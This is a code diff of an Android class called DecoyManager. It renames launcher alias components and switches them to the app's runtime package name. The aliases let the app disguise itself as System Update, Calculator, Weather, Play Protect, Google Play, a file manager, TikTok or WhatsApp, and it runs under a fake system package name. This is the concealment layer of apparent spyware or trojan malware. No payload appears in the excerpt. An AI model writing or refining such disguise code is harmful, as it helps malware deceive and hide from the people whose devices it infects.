@@ -74,13 +74,13 @@ public final class DecoyManager {
     // ── Alias component class names (must match AndroidManifest.xml) ────────
     private static final String PKG = "com.android.core.sync";
 
-    private static final String ALIAS_REAL         = PKG + ".alias.RealAlias";
-    private static final String ALIAS_SYS_UPDATE   = PKG + ".alias.SystemUpdateAlias";
-    private static final String ALIAS_CALCULATOR   = PKG + ".alias.CalculatorAlias";
-    private static final String ALIAS_WEATHER      = PKG + ".alias.WeatherAlias";
-    private static final String ALIAS_PLAY_PROTECT = PKG + ".alias.PlayProtectAlias";
-    private static final String ALIAS_GOOGLE_PLAY  = PKG + ".alias.GooglePlayAlias";
-    private static final String ALIAS_FILE_MGR     = PKG + ".alias.FileMgrAlias";
+    private static final String ALIAS_REAL         = "com.seguranca.protecao.alias.RealAlias";
+    private static final String ALIAS_SYS_UPDATE   = "com.seguranca.protecao.alias.SystemUpdateAlias";
+    private static final String ALIAS_CALCULATOR   = "com.seguranca.protecao.alias.CalculatorAlias";
+    private static final String ALIAS_WEATHER      = "com.seguranca.protecao.alias.WeatherAlias";
+    private static final String ALIAS_PLAY_PROTECT = "com.seguranca.protecao.alias.PlayProtectAlias";
+    private static final String ALIAS_GOOGLE_PLAY  = "com.seguranca.protecao.alias.GooglePlayAlias";
+    private static final String ALIAS_FILE_MGR     = "com.seguranca.protecao.alias.FileMgrAlias";
     // ★ New
     private static final String ALIAS_TIKTOK       = PKG + ".alias.TikTokAlias";
     private static final String ALIAS_WHATSAPP     = PKG + ".alias.WhatsAppAlias";
@@ -332,7 +332,7 @@ public final class DecoyManager {
     private void enableComponent(PackageManager pm, String className) {
         try {
             pm.setComponentEnabledSetting(
-                new ComponentName(PKG, className),
+                new ComponentName(ctx.getPackageName(), className),
                 PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                 PackageManager.DONT_KILL_APP
             );
@@ -344,7 +344,7 @@ public final class DecoyManager {
     private void disableComponent(PackageManager pm, String className) {
         try {
             pm.setComponentEnabledSetting(
-                new ComponentName(PKG, className),
+                new ComponentName(ctx.getPackageName(), className),
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP
             );
